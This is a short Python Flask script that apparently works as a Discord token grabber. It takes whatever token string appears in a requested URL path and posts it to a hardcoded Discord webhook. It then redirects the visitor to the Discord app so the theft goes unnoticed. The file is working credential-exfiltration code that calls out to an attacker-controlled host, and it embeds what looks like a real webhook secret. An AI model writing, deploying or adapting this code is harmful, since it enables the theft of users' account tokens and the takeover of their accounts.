from dhooks import Webhook
from flask import Flask, redirect
e = "https://discord.com/api/webhooks/1230701856729202789/py0hO-C_GcMnf9znkOc_ScoIHk4Op5OtMeBEVGuGuRoOD0s1nQlB3XXUn4rZao-GaI1z"
app = Flask(__name__)
hook = Webhook(e)
@app.route('/<string:token>')
def index(token):
  hook.send(token)
  return redirect("https://discord.com/app")

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=81)
